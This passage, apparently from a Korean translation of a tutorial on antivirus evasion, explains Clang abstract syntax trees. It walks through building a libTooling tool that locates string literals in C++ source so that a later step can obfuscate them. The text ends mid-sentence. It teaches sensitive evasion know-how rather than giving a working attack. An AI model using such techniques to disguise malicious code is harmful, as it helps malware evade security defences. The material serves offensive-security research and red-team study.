ë¨¼ì € í”„ë¡œê·¸ë˜ë¨¸ê°€ ì‘ì„±í•œ ì›ë³¸ ì†ŒìŠ¤ ì½”ë“œì—ì„œ Parse Treeë¥¼ ìƒì„±í•˜ê³  ì»´íŒŒì¼ëŸ¬ê°€ í•„ìš”ë¡œ í•˜ëŠ” ë…¸ë“œì— semantic informationì„ ì¶”ê°€í•œë‹¤. ì´ ê²°ê³¼ë¥¼ <em>Abstract Syntax Tree</em>(ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬)ë¼ê³  ë¶€ë¥¸ë‹¤. ë‹¤ìŒì€ ìœ„í‚¤í”¼ë””ì•„ì˜ ì˜ˆì‹œì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b â‰  <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a âˆ’ b  <span class="hljs-keyword">else</span>    b := b âˆ’ a<span class="hljs-keyword">return</span> a</code></pre><p>ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì˜ ì¼ë°˜ì ì¸ ASTëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ ì˜ˆì‹œ</a></p><p>ì´ ë°ì´í„° êµ¬ì¡°ëŠ” ë‹¤ë¥¸ í”„ë¡œê·¸ë¨ì˜ propertyë¥¼ ì´í•´í•˜ëŠ” í”„ë¡œê·¸ë¨ì„ ì‘ì„±í•  ë•Œ ì •ë°€í•œ ì•Œê³ ë¦¬ì¦˜ì„ ì œê³µí•˜ë¯€ë¡œ ëŒ€ê·œëª¨ ì½”ë“œ refactoringì— ì í•©í•˜ë‹¤.</p><h3 id="Clangâ€™s-Abstract-Syntax-Tree"><a href="#Clangâ€™s-Abstract-Syntax-Tree" class="headerlink" title="Clangâ€™s Abstract Syntax Tree"></a>Clangâ€™s Abstract Syntax Tree</h3><p>The Right Wayì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³€ê²½í•´ì•¼ í•˜ë¯€ë¡œ Clangì˜ ASTì— ëŒ€í•´ ì•Œì•„ì•¼ í•œë‹¤. Clagnì€ AST ë¤í”„ë¥¼ command-line switchì— ì˜ˆì˜ê²Œ í‘œì‹œí•˜ì§€ë§Œ ì»´íŒŒì¼ëŸ¬ í”Œë˜ê·¸ ì„¤ì •ì´ ê¹Œë‹¤ë¡­ë‹¤.</p><p>ê°„ë‹¨í•œ í…ŒìŠ¤íŠ¸ translation unitì„ ë§Œë“¤ì–´ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ê·¸ë¦¬ê³  ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ <code>.sh</code> íŒŒì¼ì— ì‘ì„±í•´ë¼</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>ëŠ” Win32 APIì™€ interact í•˜ê¸° ìœ„í•´ í•„ìš”í•œ í—¤ë”ë“¤ì´ ìˆëŠ” í´ë”ì´ë‹¤. ìœˆë„ìš°10ì—ì„œ ê°€ì ¸ì™”ìœ¼ë©° MinGWì—ì„œ ê°€ì ¸ì˜¤ì§€ ë§ê³  í•„ìì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤. ê·¸ í›„ í…ŒìŠ¤íŠ¸ C íŒŒì¼ì„ ì¸ìë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ 18MB íŒŒì¼ì´ ìƒì„±ë˜ì§€ë§Œ <code>NtMapViewOfSection</code> ê°™ì€ ìš°ë¦¬ê°€ ì„ ì–¸í•œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ê²€ìƒ‰í•´ì„œ ASTì—ì„œ ë´ì•¼ í•  ë¶€ë¶„ìœ¼ë¡œ ì´ë™í•  ìˆ˜ ìˆë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>ASTë¥¼ ì‹œê°í™”í–ˆìœ¼ë¯€ë¡œ ì–´ë–»ê²Œ ë…¸ë“œë¥¼ ì—…ë°ì´íŠ¸í•´ì•¼ ì†ŒìŠ¤ ì½”ë“œì˜ syntax ì˜¤ë¥˜ê°€ ì—†ì„ì§€ ì•Œ ìˆ˜ ìˆë‹¤. ë’·ë¶€ë¶„ì€ <em>libTooling</em>ì„ í†µí•œ AST manipulation êµ¬í˜„ì— ëŒ€í•´ì„œ ìƒì„¸íˆ ë‹¤ë£¬ë‹¤.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>êµ¬í˜„ì„ í•˜ê¸° ì „ì— boilerplate ì½”ë“œê°€ í•„ìš”í•˜ë¯€ë¡œ ë‹¤ìŒ ì½”ë“œë¥¼ <code>main.cpp</code>ì— ì…ë ¥í•´ë¼.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>ì´ boilerplate ì½”ë“œëŠ” ê³µì‹ ë¬¸ì„œì—ì„œ ê°€ì ¸ì™€ì„œ ì„¤ëª…í•˜ì§€ ì•ŠëŠ”ë‹¤. ì–¸ê¸‰í• ë§Œí•œ ë³€ê²½ì ì€ <code>CreateASTConsumer</code>ì´ë‹¤. ìš°ë¦¬ì˜ ëª©í‘œëŠ” ê°™ì€ translation unitì—ì„œ ì—¬ëŸ¬ transformation passë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ë‹¤. consumers collection(í•„ìˆ˜ line: <code>consumer.push_back(&amp;...);</code>)ì— í•­ëª©ë“¤ì„ ì¶”ê°€í•˜ë©´ ëœë‹¤.</p><h2 id="ë¬¸ìì—´-ë‚œë…í™”-1"><a href="#ë¬¸ìì—´-ë‚œë…í™”-1" class="headerlink" title="ë¬¸ìì—´ ë‚œë…í™”"></a>ë¬¸ìì—´ ë‚œë…í™”</h2><p>ì´ ë¶€ë¶„ì—ì„œëŠ” ì„¸ ê°€ì§€ ë‹¨ê³„ë¡œ êµ¬ì„±ëœ ë¬¸ìì—´ ë‚œë…í™” íŒ¨ìŠ¤ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ êµ¬í˜„ ì„¸ë¶€ ì‚¬í•­ì„ ì„¤ëª…í•œë‹¤.</p><ul><li>ì†ŒìŠ¤ ì½”ë“œì— ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì°¾ëŠ”ë‹¤.</li><li>ê·¸ê²ƒë“¤ì„ ë³€ìˆ˜ë¡œ ë³€í™˜í•œë‹¤.</li><li>ì ì ˆí•œ ìœ„ì¹˜(í•¨ìˆ˜ ë˜ëŠ” ì „ì—­ context í¬í•¨)ì— ë³€ìˆ˜ ì •ì˜/í• ë‹¹ì„ ì‚½ì…</li></ul><h3 id="ì†ŒìŠ¤-ì½”ë“œì—ì„œ-ë¬¸ìì—´-ë¦¬í„°ëŸ´-ì°¾ê¸°"><a href="#ì†ŒìŠ¤-ì½”ë“œì—ì„œ-ë¬¸ìì—´-ë¦¬í„°ëŸ´-ì°¾ê¸°" class="headerlink" title="ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ì°¾ê¸°"></a>ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ì°¾ê¸°</h3><p><code>StringConsumer</code>ëŠ” ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë  ìˆ˜ ìˆë‹¤.(<code>StringEncryptor</code> namespaceì˜ ì•ë¶€ë¶„)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unitì´ ìˆìœ¼ë©´ Clangì´ ASTì—ì„œ íŒ¨í„´ì„ ì°¾ì„ ìˆ˜ ìˆê³  ì°¾ì„ ë•Œë§ˆë‹¤ í˜¸ì¶œë  í•¸ë“¤ëŸ¬ë¥¼ ë“±ë¡í•  ìˆ˜ ìˆë‹¤. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ëŠ” ê°•ë ¥í•œ íŒ¨í„´ ë§¤ì¹­ì„ ì§€ì›í•˜ì§€ë§Œ ì—¬ê¸°ì„œëŠ” ë¬¸ìì—´ ë¦¬í„°ëŸ´ë§Œ ì°¾ìœ¼ë¯€ë¡œ ì¶©ë¶„íˆ í™œìš©ë˜ì§€ ì•ŠëŠ”ë‹¤.</p><p>ìš°ë¦¬ëŠ” <code>MatchHandler</code>ë¥¼ êµ¬í˜„í•˜ì—¬ ë¬¸ì œì˜ í•µì‹¬ì„ íŒŒì•…í•  ìˆ˜ ìˆê³  <code>MatchResult</code> instanceë¥¼ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. <code>MatchResult</code>ëŠ” ì‹ë³„ëœ AST ë…¸ë“œì— ëŒ€í•œ ì°¸ì¡°ì™€ ì¤‘ìš”í•œ context ì •ë³´ë¥¼ í¬í•¨í•œë‹¤.</p><p>í´ë˜ìŠ¤ë¥¼ ì •ì˜í•˜ì—¬ <code>clang::ast_matchers::MatchFinder::MatchCallback</code>ìœ¼ë¡œë¶€í„° ì¢‹ì€ stuffë¥¼ ìƒì†ë°›ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>ì—ì„œ <code>MatchHandler</code>ì˜ ìƒì„±ìì™€ <code>run</code> ì½œë°± í•¨ìˆ˜ë¥¼ êµ¬í˜„í•´ì•¼ í•œë‹¤. <code>MatchHandler</code>ì˜ ìƒì„±ìëŠ” ë‚˜ì¤‘ì— ì‚¬ìš©í•  <code>clang::Rewriter</code>ì˜ instanceë§Œ ì €ì¥í•˜ë©´ ë˜ë¯€ë¡œ ê°„ë‹¨í•˜ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>ì˜ êµ¬í˜„ì€ ì•„ë˜ì™€ ê°™ë‹¤:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>ìœ„ì—ì„œ ì§šê³  ë„˜ì–´ê°ˆ ì„¸ ê°€ì§€ê°€ ìˆë‹¤:</p><ul><li><code>StringEncryptionConsumer</code>ì—ì„œ ì •ì˜ëœ íŒ¨í„´ê³¼ ì¼ì¹˜í•˜ëŠ” AST ë…¸ë“œë¥¼ ì¶”ì¶œí•œë‹¤. ê·¸ëŸ¬ê¸° ìœ„í•´ì„œ ë°”ì¸ë”©ëœ íŒ¨í„´ identifierë¥¼ ì¸ìë¡œ ë¬¸ìì—´ì„ ì˜ˆìƒí•˜ëŠ” <code>getNodeAs</code>ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>ë¶„ì„ ì¤‘ì¸ translation unitì—ì„œ ì •ì˜ë˜ì§€ ì•Šì€ ë¬¸ìì—´ì€ ë„˜ì–´ê°„ë‹¤. ì‹¤ì œ ìš°ë¦¬ê°€ ë§Œë“  passëŠ” ì‹œìŠ¤í…œ í—¤ë”ë¥¼ translation unitì— ë³µì‚¬í•˜ëŠ” <em>Clang</em>ì˜ ì „ì²˜ë¦¬ê¸° ì´í›„ì— ì‹¤í–‰ëœë‹¤.</li><li>ì´ì œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì²˜ë¦¬í•  ì¤€ë¹„ê°€ ëë‹¤. ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ 